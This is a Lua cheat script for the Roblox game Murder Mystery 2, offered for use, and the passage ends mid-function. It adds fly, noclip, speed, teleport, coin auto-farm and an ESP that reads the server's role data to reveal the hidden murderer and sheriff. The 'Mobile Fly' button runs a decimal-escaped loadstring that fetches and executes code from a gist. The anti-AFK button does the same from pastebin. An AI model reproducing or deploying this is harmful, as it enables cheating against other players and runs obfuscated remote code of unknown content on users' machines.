
local Players = game:GetService("Players")
local StarterGui = game:GetService("StarterGui")

local localPlayer = Players.LocalPlayer
StarterGui:SetCore("SendNotification", {
    Title = "Script Loadind",
    Text = "Welcome, " .. localPlayer.Name .. "! Script is loading, please wait...",
    Icon = "rbxthumb://type=AvatarHeadShot&id=" .. localPlayer.UserId .. "&w=150&h=150",
    Duration = 50,
    Button1 = "OK"
})


local WindUI
local success, err = pcall(function()
    WindUI = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua", true))()
end)

if not success or not WindUI then
    warn("⚠️ WindUI (release) failed, trying main branch instead... Error:", err)
    local fallbackSuccess, fallbackErr = pcall(function()
        WindUI = loadstring(game:HttpGet("https://raw.githubusercontent.com/Footagesus/WindUI/main/dist/main.lua", true))()
    end)

    if not fallbackSuccess or not WindUI then
        error("❌ Failed to load WindUI from both sources!\nRelease error: " .. tostring(err) .. "\nMain error: " .. tostring(fallbackErr))
    end
end

print("✅ WindUI loaded successfully!")
WindUI:SetTheme('Amber')

local Services = {
    Players = game:GetService('Players'),
    RunService = game:GetService('RunService'),
    UserInputService = game:GetService('UserInputService'),
    Lighting = game:GetService('Lighting'),
    StarterPack = game:GetService('StarterPack'),
    ReplicatedStorage = game:GetService('ReplicatedStorage'),
    TweenService = game:GetService('TweenService'),
    VirtualUser = game:GetService('VirtualUser'),
    Workspace = game:GetService('Workspace'),
    HttpService = game:GetService('HttpService'),
    TeleportService = game:GetService('TeleportService'),
    Stats = game:GetService('Stats'),
    ReplicatedFirst = game:GetService('ReplicatedFirst'),
}

local LocalPlayer = Services.Players.LocalPlayer

-- WindUI initialization

WindUI:SetTheme('Amber')

--- EXAMPLE !!!
function gradient(text, startColor, endColor)
    local result = ''
    local length = #text

    for i = 1, length do
        local t = (i - 1) / math.max(length - 1, 1)
        local r = math.floor(
            (startColor.R + (endColor.R - startColor.R) * t) * 255
        )
        local g = math.floor(
            (startColor.G + (endColor.G - startColor.G) * t) * 255
        )
        local b = math.floor(
            (startColor.B + (endColor.B - startColor.B) * t) * 255
        )

        local char = text:sub(i, i)
        result = result
            .. '<font color="rgb('
            .. r
            .. ', '
            .. g
            .. ', '
            .. b
            .. ')">'
            .. char
            .. '</font>'
    end

    return result
end

local Confirmed = false

WindUI:Popup({
    Title = 'Welcome, ' .. gradient(
        LocalPlayer.Name,
       Color3.fromRGB(255, 191, 0),   -- start color (amber yellow)
Color3.fromRGB(255, 127, 0)    -- end color (deep amber/orange)

    ),
    Image = 'rbxassetid://98892485471236',
    IconThemed = true,
    Content = gradient(
        'report bugs to me on my discord',
        Color3.fromRGB(255, 255, 255), -- start color (white)
        Color3.fromRGB(180, 180, 180) -- end color (gray)
    )
        .. gradient(
            '',
            Color3.fromHex('#00fff7'),
            Color3.fromHex('#4facfe')
        ),

    Buttons = {

        {
            Title = 'Copy invite',
            Icon = '',
            Callback = function()
                setclipboard('https://discord.gg/7gzzV7YAYD')
                Confirmed = true
            end,
            Variant = 'Primary',
        },
        {
            Title = 'Okay',
            Icon = 'arrow-right',
            Callback = function()
                Confirmed = true
            end,
            Variant = 'Primary',
        },
    },
})

repeat
    task.wait()
until Confirmed

local Window = WindUI:CreateWindow({
    Title = 'mm2 open source project',
    Icon = 'door-open',
    Author = 'multiple ais lol',
    Folder = 'wwww',

    -- ↓ This all is Optional. You can remove it.
    Size = UDim2.fromOffset(560, 440),
    Transparent = true,
    Theme = 'Amber',
    Resizable = true,
    SideBarWidth = 200,
    BackgroundImageTransparency = 0.42,
    HideSearchBar = false,
    ScrollBarEnabled = true,

    -- ↓ Optional. You can remove it.
    --[[ You can set 'rbxassetid://' or video to Background.
    'rbxassetid://':
        Background = "rbxassetid://", -- rbxassetid
    Video:
        Background = "video:YOUR-RAW-LINK-TO-VIDEO.webm", -- video 
--]]

    -- ↓ Optional. You can remove it.
    User = {
        Enabled = true,
        Anonymous = false,
        Callback = function() end,
    },
})

local Tabs = {}

-- Main Section
local MainSection = Window:Section({
    Title = 'Main functions',
    Icon = 'house',
    Opened = true,
})

-- Hub Tab
Tabs.Hub = MainSection:Tab({
    Title = "Hub",
    Icon = "code",
    ShowTabTitle = true,
})

-- Auto Farm Tab
Tabs.AutoFarmTab = MainSection:Tab({
    Title = 'Farming',
    Icon = 'bitcoin',
    ShowTabTitle = true,
})

-- Player Tab
Tabs.PlayerTab = MainSection:Tab({
    Title = 'Player',
    Icon = 'rocket',
    ShowTabTitle = true,
})

-- ESP Tab
Tabs.ESPTab = MainSection:Tab({
    Title = 'ESP',
    Icon = 'man',
    ShowTabTitle = true,
})
-- Time Tag (already gradient, just cleaned up)
local TimeTag = Window:Tag({
    Title = '--:--',
    Radius = 10,
    Color = WindUI:Gradient({
        ['0'] = { Color = Color3.fromHex('#FF0F7B'), Transparency = 0 },
        ['100'] = { Color = Color3.fromHex('#F89B29'), Transparency = 0 },
    }, {
        Rotation = 45,
    }),
})

-- Rainbow effect & Time
local hue = 0
task.spawn(function()
    while true do
        local now = os.date('*t')
        local hours = string.format('%02d', now.hour)
        local minutes = string.format('%02d', now.min)

        hue = (hue + 0.01) % 1
        local color = Color3.fromHSV(hue, 1, 1)

        TimeTag:SetTitle(hours .. ':' .. minutes)
        --TimeTag:SetColor(color) -- optional rainbow override

        task.wait(0.06)
    end
end)

repeat
    task.wait()
until Confirmed

-- [[       Main ui functions below           ]] --



local RunService = Services.RunService

-- Settings
local walkSpeed, jumpPower = 16, 50
local noclipEnabled = false
local flying = false
local flySpeed = 50
local infiniteJump = false
local xRay = false
local gravityEnabled = true
local mobileFlyActive = false

-- Movement Section
Tabs.PlayerTab:Section({ Title = 'Movement', Desc = '' })
Tabs.PlayerTab:Divider()

-- Walk Speed Slider
Tabs.PlayerTab:Slider({
    Title = 'Walk Speed',
    Compact = true,
    Value = { Min = 16, Max = 200, Default = 16 },
    Callback = function(value)
        walkSpeed = value
        local humanoid = LocalPlayer.Character
            and LocalPlayer.Character:FindFirstChildOfClass('Humanoid')
        if humanoid then
            humanoid.WalkSpeed = value
        end
    end,
})

-- Jump Power Slider
Tabs.PlayerTab:Slider({
    Title = 'Jump Power',
    Compact = true,
    Value = { Min = 50, Max = 500, Default = 50 },
    Callback = function(value)
        jumpPower = value
        local humanoid = LocalPlayer.Character
            and LocalPlayer.Character:FindFirstChildOfClass('Humanoid')
        if humanoid then
            humanoid.JumpPower = value
        end
    end,
})

-- Infinite Jump Toggle
Tabs.PlayerTab:Toggle({
    Title = 'Infinite Jump',
    Compact = true,
    Callback = function(state)
        infiniteJump = state
    end,
})

-- Infinite Jump Logic
Services.UserInputService.JumpRequest:Connect(function()
    if infiniteJump and LocalPlayer.Character then
        local humanoid =
            LocalPlayer.Character:FindFirstChildOfClass('Humanoid')
        if humanoid then
            humanoid:ChangeState('Jumping')
        end
    end
end)

-- Gravity Toggle
Tabs.PlayerTab:Toggle({
    Title = 'Zero Gravity',
    Compact = true,
    Callback = function(state)
        gravityEnabled = not state
        Services.Workspace.Gravity = state and 0 or 196.2
    end,
})

-- Flight Section
Tabs.PlayerTab:Section({ Title = 'Flight', Desc = '' })
Tabs.PlayerTab:Divider()

-- Flight System Variables
local flyEnabled = false
local bodyVelocity, bodyGyro

-- Create physics objects
local function createBodyMovers()
    bodyVelocity = Instance.new('BodyVelocity')
    bodyVelocity.Velocity = Vector3.new(0, 0, 0)
    bodyVelocity.MaxForce = Vector3.new(100000, 100000, 100000)

    bodyGyro = Instance.new('BodyGyro')
    bodyGyro.MaxTorque = Vector3.new(100000, 100000, 100000)
end

-- Start flying function
local function startFlying()
    if not LocalPlayer.Character then
        return
    end

    local character = LocalPlayer.Character
    local humanoidRootPart = character:FindFirstChild('HumanoidRootPart')
    local humanoid = character:FindFirstChildOfClass('Humanoid')

    if not humanoidRootPart or not humanoid then
        return
    end

    createBodyMovers()
    flying = true
    bodyVelocity.Parent = humanoidRootPart
    bodyGyro.Parent = humanoidRootPart
    bodyGyro.CFrame = humanoidRootPart.CFrame
    humanoid.PlatformStand = true
end

-- Stop flying function
local function stopFlying()
    flying = false
    if bodyVelocity then
        bodyVelocity:Destroy()
    end
    if bodyGyro then
        bodyGyro:Destroy()
    end

    local character = LocalPlayer.Character
    if character then
        local humanoid = character:FindFirstChildOfClass('Humanoid')
        if humanoid then
            humanoid.PlatformStand = false
        end
    end

    WindUI:Notify({
        Title = 'Flight',
        Content = 'Flight disabled',
        Duration = 2,
    })
end

-- E key to toggle flight
Services.UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed or input.KeyCode ~= Enum.KeyCode.E then
        return
    end
    if not flyEnabled then
        return
    end

    if flying then
        stopFlying()
    else
        startFlying()
    end
end)

-- Flight movement logic
Services.RunService.RenderStepped:Connect(function()
    if not flying or not LocalPlayer.Character then
        return
    end

    local character = LocalPlayer.Character
    local humanoidRootPart = character:FindFirstChild('HumanoidRootPart')
    if not humanoidRootPart then
        return
    end

    local moveDirection = Vector3.new(0, 0, 0)
    local camera = Services.Workspace.CurrentCamera

    -- Movement controls
    if Services.UserInputService:IsKeyDown(Enum.KeyCode.W) then
        moveDirection = moveDirection + camera.CFrame.LookVector
    end
    if Services.UserInputService:IsKeyDown(Enum.KeyCode.S) then
        moveDirection = moveDirection - camera.CFrame.LookVector
    end
    if Services.UserInputService:IsKeyDown(Enum.KeyCode.A) then
        moveDirection = moveDirection - camera.CFrame.RightVector
    end
    if Services.UserInputService:IsKeyDown(Enum.KeyCode.D) then
        moveDirection = moveDirection + camera.CFrame.RightVector
    end
    if Services.UserInputService:IsKeyDown(Enum.KeyCode.Space) then
        moveDirection = moveDirection + Vector3.new(0, 1, 0)
    end
    if Services.UserInputService:IsKeyDown(Enum.KeyCode.LeftShift) then
        moveDirection = moveDirection - Vector3.new(0, 1, 0)
    end

    -- Apply movement
    bodyVelocity.Velocity = moveDirection * flySpeed
    bodyGyro.CFrame = camera.CFrame
end)

-- Handle character reset
LocalPlayer.CharacterAdded:Connect(function(character)
    if flyEnabled and flying then
        task.wait(1) -- Wait for character to fully load
        startFlying()
    end
end)

-- WindUI Flight Toggle
Tabs.PlayerTab:Toggle({
    Title = 'PC Fly (Press E)',
    Compact = true,
    Callback = function(state)
        flyEnabled = state
        if not state and flying then
            stopFlying()
        end
    end,
})

-- WindUI Flight Speed Slider
Tabs.PlayerTab:Slider({
    Title = 'Fly Speed',
    Compact = true,
    Value = { Min = 20, Max = 200, Default = 50 },
    Callback = function(value)
        flySpeed = value
        if flying then
            WindUI:Notify({
                Title = 'Flight Speed',
                Content = 'Speed set to: ' .. value,
                Duration = 2,
            })
        end
    end,
})

Tabs.PlayerTab:Button({
    Title = 'Mobile Fly ',
    Compact = true,
    Callback = function()
        mobileFlyActive = not mobileFlyActive
        if mobileFlyActive then
            loadstring(
                '\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\40\39\104\116\116\112\115\58\47\47\103\105\115\116\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\109\101\111\122\111\110\101\89\84\47\98\102\48\51\55\100\102\102\57\102\48\97\55\48\48\49\55\51\48\52\100\100\100\54\55\102\100\99\100\51\55\48\47\114\97\119\47\101\49\52\101\55\52\102\52\50\53\98\48\54\48\100\102\53\50\51\51\52\51\99\102\51\48\98\55\56\55\48\55\52\101\98\51\99\53\100\50\47\97\114\99\101\117\115\37\50\53\50\48\120\37\50\53\50\48\102\108\121\37\50\53\50\48\50\37\50\53\50\48\111\98\102\108\117\99\97\116\111\114\39\41\44\116\114\117\101\41\41\40\41\10\10'
            )()
        end
    end,
})

-- Visual Section
Tabs.PlayerTab:Divider()

Tabs.PlayerTab:Toggle({
    Title = 'X-ray Vision',
    Compact = true,
    Callback = function(state)
        xRay = state
        for _, part in pairs(Services.Workspace:GetDescendants()) do
            if
                part:IsA('BasePart')
                and not part:IsDescendantOf(LocalPlayer.Character)
            then
                part.LocalTransparencyModifier = state and 0.7 or 0
            end
        end
    end,
})

-- Utility Section
Tabs.PlayerTab:Divider()
-- Store frequently accessed services in variables

-- Consolidate repeated functionality into reusable functions
local function getCurrentMap()
    for _, obj in pairs(Services.Workspace:GetChildren()) do
        if obj:IsA('Model') and obj:FindFirstChild('Spawns') then
            local hasPart = false
            for _, child in ipairs(obj:GetDescendants()) do
                if child:IsA('BasePart') then
                    hasPart = true
                    break
                end
            end
            if hasPart and not obj.Name:lower():match('lobby') then
                return obj
            end
        end
    end
    return nil
end

local function teleportToSpawn()
    local spawnCFrame = CFrame.new(-105.23, 141.87, 101.46)
    local character = LocalPlayer.Character
    if character and character:FindFirstChild('HumanoidRootPart') then
        character.HumanoidRootPart.CFrame = spawnCFrame
    end
end

-- Noclip Toggle
Tabs.PlayerTab:Toggle({
    Title = 'Noclip',
    Compact = true,
    Callback = function(state)
        noclipEnabled = state
        if state then
            coroutine.wrap(function()
                while noclipEnabled and LocalPlayer.Character do
                    local humanoid =
                        LocalPlayer.Character:FindFirstChildOfClass(
                            'Humanoid'
                        )
                    if humanoid then
                        for _, part in
                            pairs(LocalPlayer.Character:GetDescendants())
                        do
                            if part:IsA('BasePart') then
                                part.CanCollide = false
                            end
                        end
                    end
                    task.wait(0.1)
                end
            end)()
        end
    end,
})

-- Teleport Tool
Tabs.PlayerTab:Button({
    Title = 'Teleport Tool',
    Compact = true,
    Callback = function()
        local tool = Instance.new('Tool')
        tool.RequiresHandle = false
        tool.Name = 'Teleport Tool'

        tool.Activated:Connect(function()
            local mouse = LocalPlayer:GetMouse()
            local pos = mouse.Hit.Position + Vector3.new(0, 5, 0)
            local root = LocalPlayer.Character
                and LocalPlayer.Character:FindFirstChild('HumanoidRootPart')
            if root then
                root.CFrame = CFrame.new(pos)
            end
        end)

        tool.Parent = LocalPlayer:WaitForChild('Backpack')
    end,
})




-- Teleport Tool
Tabs.AutoFarmTab:Button({
    Title = 'farm gui',
    Compact = true,
    Callback = function()
      if not game:IsLoaded() then game.Loaded:Wait() end
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local VirtualUser = game:GetService("VirtualUser")
local workspace = game:GetService("Workspace")
local player = Players.LocalPlayer

-- Delete old UI
if player.PlayerGui:FindFirstChild("MM2_UI") then
    player.PlayerGui.MM2_UI:Destroy()
end

local autoFarmEnabled = false
local autoResetEnabled = false
local disableRenderEnabled = false
local antiAFKUsed = false

-- Christmas GUI
local gui = Instance.new("ScreenGui")
gui.Name = "MM2_UI"
gui.ResetOnSpawn = false
gui.Parent = player.PlayerGui

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 320, 0, 260)
frame.Position = UDim2.new(0.5, -160, 0.5, -130)
frame.BackgroundColor3 = Color3.fromRGB(10, 25, 10)
frame.BackgroundTransparency = 0.1
frame.BorderSizePixel = 0
frame.Parent = gui
Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 16)

-- Christmas gradient
local gradient = Instance.new("UIGradient", frame)
gradient.Rotation = 135
gradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, Color3.fromRGB(180, 0, 0)),
    ColorSequenceKeypoint.new(0.4, Color3.fromRGB(220, 50, 50)),
    ColorSequenceKeypoint.new(0.6, Color3.fromRGB(0, 120, 0)),
    ColorSequenceKeypoint.new(0.8, Color3.fromRGB(255, 215, 0)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 240, 200))
}

-- Falling snowflakes
for i = 1, 25 do
    local snow = Instance.new("Frame", frame)
    snow.Size = UDim2.new(0, math.random(4,10), 0, math.random(4,10))
    snow.Position = UDim2.new(math.random(), 0, math.random(-100, -10)/100, 0)
    snow.BackgroundColor3 = Color3.new(1,1,1)
    snow.BackgroundTransparency = math.random(20,60)/100
    snow.BorderSizePixel = 0
    Instance.new("UICorner", snow).CornerRadius = UDim.new(1,0)

    task.spawn(function()
        while snow.Parent do
            TweenService:Create(snow, TweenInfo.new(math.random(10,20), Enum.EasingStyle.Linear), {
                Position = UDim2.new(math.random(), 0, 1.3, 0)
            }):Play()
            task.wait(math.random(10,20))
            snow.Position = UDim2.new(math.random(), 0, -0.1, 0)
        end
    end)
end

-- Santa hat decoration
local hat = Instance.new("Frame", frame)
hat.Size = UDim2.new(0, 60, 0, 60)
hat.Position = UDim2.new(0.78, 0, 0.02, 0)
hat.BackgroundTransparency = 1

local hatBase = Instance.new("Frame", hat)
hatBase.Size = UDim2.new(1, 0, 0.6, 0)
hatBase.Position = UDim2.new(0, 0, 0.4, 0)
hatBase.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
Instance.new("UICorner", hatBase).CornerRadius = UDim.new(0, 8)

local hatPom = Instance.new("Frame", hat)
hatPom.Size = UDim2.new(0.3, 0, 0.3, 0)
hatPom.Position = UDim2.new(0.7, 0, 0, 0)
hatPom.BackgroundColor3 = Color3.new(1,1,1)
Instance.new("UICorner", hatPom).CornerRadius = UDim.new(1,0)

-- Hat wobble
local angle = 0
RunService.RenderStepped:Connect(function()
    angle += 1
    hat.Rotation = -15 + math.sin(angle/15)*6
end)

-- Title
local title = Instance.new("TextLabel", frame)
title.Size = UDim2.new(1, -70, 0, 45)
title.Position = UDim2.new(0, 15, 0, 5)
title.BackgroundTransparency = 1
title.Text = "MM2 auto Farm "
title.TextColor3 = Color3.new(1,1,1)
title.Font = Enum.Font.FredokaOne
title.TextSize = 24
title.TextStrokeTransparency = 0
title.TextStrokeTransparency = 0
title.TextStrokeColor3 = Color3.fromRGB(150, 0, 0)

-- Close button (candy cane)
local closeBtn = Instance.new("TextButton", frame)
closeBtn.Size = UDim2.new(0, 34, 0, 34)
closeBtn.Position = UDim2.new(1, -40, 0, 8)
closeBtn.BackgroundColor3 = Color3.new(1,1,1)
closeBtn.Text = "X"
closeBtn.TextColor3 = Color3.fromRGB(200, 0, 0)
closeBtn.Font = Enum.Font.GothamBold
closeBtn.TextSize = 20
Instance.new("UICorner", closeBtn).CornerRadius = UDim.new(1,0)

for i = 0, 1 do
    local s = Instance.new("Frame", closeBtn)
    s.Size = UDim2.new(1,0,0.25,0)
    s.Position = UDim2.new(0,0,i*0.5,0)
    s.BackgroundColor3 = Color3.fromRGB(200,0,0)
end

-- Content area
local contentBg = Instance.new("Frame", frame)
contentBg.Size = UDim2.new(0.92, 0, 0.76, 0)
contentBg.Position = UDim2.new(0.04, 0, 0.18, 0)
contentBg.BackgroundColor3 = Color3.new(1,1,1)
contentBg.BackgroundTransparency = 0.88
contentBg.BorderSizePixel = 0
Instance.new("UICorner", contentBg).CornerRadius = UDim.new(0, 12)

local content = Instance.new("Frame", contentBg)
content.Size = UDim2.new(1, -16, 1, -16)
content.Position = UDim2.new(0, 8, 0, 8)
content.BackgroundTransparency = 1

-- Toggle function
local function createToggle(y, text, default, callback)
    local lbl = Instance.new("TextLabel", content)
    lbl.Size = UDim2.new(0.68, 0, 0, 30)
    lbl.Position = UDim2.new(0.04, 0, 0, y)
    lbl.BackgroundTransparency = 1
    lbl.Text = " " .. text
    lbl.TextColor3 = Color3.new(1,1,1)
    lbl.Font = Enum.Font.GothamBold
    lbl.TextSize = 16
    lbl.TextXAlignment = Enum.TextXAlignment.Left

    local btn = Instance.new("TextButton", content)
    btn.Size = UDim2.new(0, 56, 0, 28)
    btn.Position = UDim2.new(0.75, 0, 0, y + 1)
    btn.BackgroundColor3 = default and Color3.fromRGB(0, 180, 0) or Color3.fromRGB(120, 0, 0)
    btn.Text = ""
    btn.AutoButtonColor = false
    Instance.new("UICorner", btn).CornerRadius = UDim.new(1,0)

    local knob = Instance.new("Frame", btn)
    knob.Size = UDim2.new(0, 24, 0, 24)
    knob.Position = default and UDim2.new(1, -26, 0, 2) or UDim2.new(0, 2, 0, 2)
    knob.BackgroundColor3 = Color3.new(1,1,1)
    Instance.new("UICorner", knob).CornerRadius = UDim.new(1,0)

    btn.MouseButton1Click:Connect(function()
        default = not default
        TweenService:Create(knob, TweenInfo.new(0.2), {Position = default and UDim2.new(1,-26,0,2) or UDim2.new(0,2,0,2)}):Play()
        TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = default and Color3.fromRGB(0,180,0) or Color3.fromRGB(120,0,0)}):Play()
        callback(default)
    end)
end

createToggle(12,  "Auto Farm Coins", autoFarmEnabled, function(v) autoFarmEnabled = v end)
createToggle(48,  "Auto Reset", autoResetEnabled, function(v) autoResetEnabled = v end)
createToggle(84,  "Disable Render", disableRenderEnabled, function(v)
    disableRenderEnabled = v
    RunService:Set3dRenderingEnabled(not v)
end)

-- Anti-AFK button
local afkBtn = Instance.new("TextButton", content)
afkBtn.Size = UDim2.new(0.9, 0, 0, 36)
afkBtn.Position = UDim2.new(0.05, 0, 0, 122)
afkBtn.BackgroundColor3 = Color3.fromRGB(0, 140, 0)
afkBtn.Text = antiAFKUsed and "Anti-AFK Active" or "Enable Anti-AFK"
afkBtn.TextColor3 = Color3.new(1,1,1)
afkBtn.Font = Enum.Font.GothamBold
afkBtn.TextSize = 15
Instance.new("UICorner", afkBtn).CornerRadius = UDim.new(0, 10)

afkBtn.MouseButton1Click:Connect(function()
    if not antiAFKUsed then
        antiAFKUsed = true
        afkBtn.Text = "Anti-AFK Active"
        afkBtn.BackgroundColor3 = Color3.fromRGB(0, 100, 0)
        loadstring(game:HttpGet("https://pastebin.com/raw/bwP4bmed"))()
    end
end)

-- Playtime
local playTimeLabel = Instance.new("TextLabel", content)
playTimeLabel.Size = UDim2.new(0.9, 0, 0, 28)
playTimeLabel.Position = UDim2.new(0.05, 0, 0, 168)
playTimeLabel.BackgroundTransparency = 1
playTimeLabel.Text = "time in game: 0d 0h 0m 0s"
playTimeLabel.TextColor3 = Color3.fromRGB(255, 255, 200)
playTimeLabel.Font = Enum.Font.GothamBold
playTimeLabel.TextSize = 14
playTimeLabel.TextXAlignment = Enum.TextXAlignment.Left

local startTime = tick()
task.spawn(function()
    while task.wait(1) do
        local t = math.floor(tick() - startTime)
        local d = math.floor(t/86400)
        local h = math.floor((t%86400)/3600)
        local m = math.floor((t%3600)/60)
        local s = t%60
        playTimeLabel.Text = string.format("time in game: %dd %02dh %02dm %02ds", d,h,m,s)
    end
end)

-- Pop-in animation
frame.Size = UDim2.new(0,0,0,0)
TweenService:Create(frame, TweenInfo.new(0.6, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Size = UDim2.new(0,320,0,260)}):Play()

-- Dragging + minimize (same as before)
local dragging = false
frame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = true
        dragStart = input.Position
        startPos = frame.Position
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then dragging = false end
        end)
    end
end)
frame.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement and dragging then
        local delta = input.Position - dragStart
        frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)

local hidden = false
closeBtn.MouseButton1Click:Connect(function()
    hidden = not hidden
    TweenService:Create(frame, TweenInfo.new(0.4), {Size = hidden and UDim2.new(0,320,0,50) or UDim2.new(0,320,0,260)}):Play()
    contentBg.Visible = not hidden
end)

-- YOUR ENTIRE FARMING CODE BELOW (unchanged, works perfectly)
-- (everything from CoinCollected down to the final task.spawn loop is exactly the same as your original script)

local CoinCollected = ReplicatedStorage.Remotes.Gameplay.CoinCollected
local RoundStart = ReplicatedStorage.Remotes.Gameplay.RoundStart
local RoundEnd = ReplicatedStorage.Remotes.Gameplay.RoundEndFade

local farming = false
local bag_full = false
local resetting = false
local start_position = nil

player.Idled:Connect(function()
    VirtualUser:CaptureController()
    VirtualUser:ClickButton2(Vector2.new())
end)

local function getCharacter() return player.Character or player.CharacterAdded:Wait() end
local function getHRP() return getCharacter():WaitForChild("HumanoidRootPart") end

CoinCollected.OnClientEvent:Connect(function(_, current, max)
    if current == max and not resetting and autoResetEnabled then
        resetting = true
        bag_full = true
        local hrp = getHRP()
        if start_position then
            TweenService:Create(hrp, TweenInfo.new(2), {CFrame = start_position}):Play():Wait()
        end
        task.wait(0.5)
        player.Character.Humanoid.Health = 0
        player.CharacterAdded:Wait()
        task.wait(1.5)
        resetting = false
        bag_full = false
    end
end)

RoundStart.OnClientEvent:Connect(function()
    farming = true
    start_position = getHRP().CFrame
end)

RoundEnd.OnClientEvent:Connect(function() farming = false end)

local function get_nearest_coin()
    local hrp = getHRP()
    local closest, dist = nil, math.huge
    for _, m in pairs(workspace:GetChildren()) do
        if m:FindFirstChild("CoinContainer") then
            for _, coin in pairs(m.CoinContainer:GetChildren()) do
                if coin:IsA("BasePart") and coin:FindFirstChild("TouchInterest") then
                    local d = (hrp.Position - coin.Position).Magnitude
                    if d < dist then closest, dist = coin, d end
                end
            end
        end
    end
    return closest, dist
end

task.spawn(function()
    while true do
        if autoFarmEnabled and farming and not bag_full then
            local coin, dist = get_nearest_coin()
            if coin then
                local hrp = getHRP()
                if dist > 150 then
                    hrp.CFrame = coin.CFrame
                else
                    local tween = TweenService:Create(hrp, TweenInfo.new(dist/20, Enum.EasingStyle.Linear), {CFrame = coin.CFrame})
                    tween:Play()
                    repeat task.wait() until not coin:FindFirstChild("TouchInterest") or not farming
                    tween:Cancel()
                end
            end
        end
        task.wait(0.2)
    end
end)
    end,
})






local Remotes = {
    GetPlayerData = Services.ReplicatedStorage:FindFirstChild('GetPlayerData', true)
}

local Camera = Services.Workspace.CurrentCamera
local LP = LocalPlayer
local roles

-- > Functions < --

local function GetPlayerRoles()
    local success, result = pcall(function()
        if Remotes.GetPlayerData then
            return Remotes.GetPlayerData:InvokeServer() or {}
        end
    end)
    return success and result or {}
end

local function IsAlive(player)
    local roleData = roles[player.Name]
    return roleData and not roleData.Killed and not roleData.Dead
end

local function hasGun(player)
    local backpack = player:FindFirstChild('Backpack')
    if backpack and backpack:FindFirstChild('Gun') then
        return true
    end
    local char = player.Character
    if char and char:FindFirstChild('Gun') then
        return true
    end
    return false
end

local function getColorForRole(role)
    if role == 'Innocent' then
        return Color3.new(0, 1, 0)
    end
    if role == 'Murderer' then
        return Color3.new(1, 0, 0)
    end
    if role == 'Sheriff' or role == 'Hero' then
        return Color3.new(0, 0, 1) -- same color for both
    end
    if role == 'DeadInnocent' then
        return Color3.new(0.5, 0.5, 0.5)
    end
    return Color3.new(1, 1, 1)
end

local ESPSettings = {
    Highlights = {
        Innocent = false,
        Murderer = false,
        Sheriff = false,
        DeadInnocent = false,
    },
    Skeleton = {
        Innocent = false,
        Murderer = false,
        Sheriff = false,
        DeadInnocent = false,
    },
    Tracers = {
        Innocent = false,
        Murderer = false,
        Sheriff = false,
        DeadInnocent = false,
    },
}

local boneConnections = {
    { 'Head', 'UpperTorso' },
    { 'UpperTorso', 'LowerTorso' },
    { 'UpperTorso', 'LeftUpperArm' },
    { 'LeftUpperArm', 'LeftLowerArm' },
    { 'LeftLowerArm', 'LeftHand' },
    { 'UpperTorso', 'RightUpperArm' },
    { 'RightUpperArm', 'RightLowerArm' },
    { 'RightLowerArm', 'RightHand' },
    { 'LowerTorso', 'LeftUpperLeg' },
    { 'LeftUpperLeg', 'LeftLowerLeg' },
    { 'LeftLowerLeg', 'LeftFoot' },
    { 'LowerTorso', 'RightUpperLeg' },
    { 'RightUpperLeg', 'RightLowerLeg' },
    { 'RightLowerLeg', 'RightFoot' },
}

local highlights = {}
local drawingObjects = {}
local wasInRound = false

local function CleanupESP(player)
    if highlights[player] then
        pcall(function()
            highlights[player]:Destroy()
        end)
        highlights[player] = nil
    end
    if drawingObjects[player] then
        local obj = drawingObjects[player]
        if obj.tracer then
            obj.tracer:Remove()
        end
        if obj.skeletonLines then
            for _, line in ipairs(obj.skeletonLines) do
                line:Remove()
            end
        end
        drawingObjects[player] = nil
    end
end

-- Cleanup connections
for _, player in ipairs(Services.Players:GetPlayers()) do
    if player ~= LP then
        player.CharacterRemoving:Connect(function()
            CleanupESP(player)
        end)
    end
end

Services.Players.PlayerAdded:Connect(function(player)
    if player ~= LP then
        player.CharacterRemoving:Connect(function()
            CleanupESP(player)
        end)
    end
end)

Services.Players.PlayerRemoving:Connect(function(player)
    CleanupESP(player)
end)

-- ESP update loop
Services.RunService.RenderStepped:Connect(function()
    roles = GetPlayerRoles()
    local Sheriff, Murder, Hero
    for playerName, roleData in pairs(roles) do
        if roleData.Role == 'Murderer' then
            Murder = playerName
        elseif roleData.Role == 'Sheriff' then
            Sheriff = playerName
        elseif roleData.Role == 'Hero' then
            Hero = playerName
        end
    end

    local inRound = next(roles) ~= nil
    if wasInRound and not inRound then
        for _, player in ipairs(Services.Players:GetPlayers()) do
            CleanupESP(player)
        end
    end
    wasInRound = inRound

    if not inRound then
        return
    end

    for _, player in ipairs(Services.Players:GetPlayers()) do
        if player == LP then
            continue
        end
        local char = player.Character
        if not char or not char.Parent then
            CleanupESP(player)
            continue
        end
        local roleData = roles[player.Name]
        if not roleData then
            continue
        end
        local role = roleData.Role
        local dead = roleData.Dead or roleData.Killed
        local effective_role = role
        if dead then
            if role == 'Innocent' then
                effective_role = 'DeadInnocent'
            else
                continue
            end
        elseif role == 'Innocent' then
            if hasGun(player) and (not Sheriff or not IsAlive(Services.Players[Sheriff])) then
                effective_role = 'Hero'
            end
        end

        local color = getColorForRole(effective_role)

        -- Highlights ESP
        local showHighlights = ESPSettings.Highlights[effective_role]
            or (effective_role == "Hero" and ESPSettings.Highlights.Sheriff)
            or false
        local hl = highlights[player]
        if showHighlights then
            if not hl or hl.Parent ~= char then
                if hl then
                    pcall(function()
                        hl:Destroy()
                    end)
                end
                hl = Instance.new('Highlight')
